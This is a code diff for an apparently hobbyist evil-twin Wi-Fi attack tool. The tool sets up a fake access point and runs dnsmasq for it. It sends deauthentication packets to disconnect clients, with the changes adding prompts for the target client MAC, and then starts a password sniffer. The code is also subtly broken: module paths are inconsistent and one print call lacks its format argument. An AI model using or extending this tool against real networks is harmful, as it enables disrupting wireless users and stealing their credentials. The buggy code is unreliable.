@@ -6,37 +6,32 @@ from moduless import methods
 from moduless import passsniff
 
 
-def configs():
+def configs(iface):
     pwd = os.getcwd()
 
-    if len(sys.argv) <= 1:
-        sys.exit()
-
-    os.system("xterm -e python3 moduless/dump.py {0} &".format(sys.argv[1]))
-    essid = input("[^] (Target essid)-> ")
+    os.system("xterm -e python3 moduless/dump.py {0}".format(iface))
+    essid = input(u"\u001b[33;1m[^] (Target essid)-> ")
     if essid == "":
         print("E...r")
         sys.exit()
     else:
-        print("[*] Set {0} Target essid!".format(essid))
+        print(u"\u001b[32;1m[*] Set {0} Target essid!".format(essid))
 
-    bssid = input("[^] (Wifi bssid)-> ")
+    bssid = input(u"\u001b[33;1m[^] (Wifi bssid)-> ")
     if bssid == "":
         print("E...r")
         sys.exit()
     else:
-        print("[*] Set {0} Target bssid!".format(bssid))
+        print(u"\u001b[32;1m[*] Set {0} Target bssid!".format(bssid))
 
-    channel = input("[^] (Target channel)-> ")
+    channel = input(u"\u001b[33;1m[^] (Target channel)-> ")
     if channel == "":
         print("E...r")
         sys.exit()
     else:
-        print("[*] Set {0} Target channel!".format(channel))
+        print(u"\u001b[32;1m[*] Set {0} Target channel!".format(channel))
 
-    iface = sys.argv[1]
-
-    ethstat = input("[^] (interface for redirect packets)-> ")
+    ethstat = input(u"\u001b[33;1m[^] (interface for redirect packets)-> ")
     if ethstat == "" or ethstat == " ":
         eth = None
     else:
@@ -56,8 +51,8 @@ def configs():
     return result
 
 
-def main():
-    config = configs()
+def start(iface):
+    config = configs(iface)
     print("[*] Create evil twin")
     methods.createfake(config["iface"], config["essid"], config["bssid"], config["channel"])
     print("[*] Configure dnsmasq")
@@ -91,8 +86,14 @@ def main():
 
         dos = input("[^] send Deauth packet? yes/no # ")
         if dos == "yes" or dos == "Yes" or dos == "YES":
-            methods.Deauth(bssid, iface)
+            clientmac = input("[^] (Client mac address[ff:ff:ff:ff:ff:ff])-> ")
+            if clientmac == "" or clientmac == " ":
+                print("[*] Set ff:ff:ff:ff:ff:ff Client mac address!")
+            wifimac = input("[^] (Wifi Bssid)-> ")
+            if wifimac == "" or wifimac == " ":
+                print("E...r")
+                sys.exit(1)
+            print("[*] Set {0} Wifi bssid!")
+            os.system("xterm -e python3 modules/Deauth.py {0} {1} {2}".format(clientmac, wifimac, iface))
 
         passsniff.start()
-
-main()
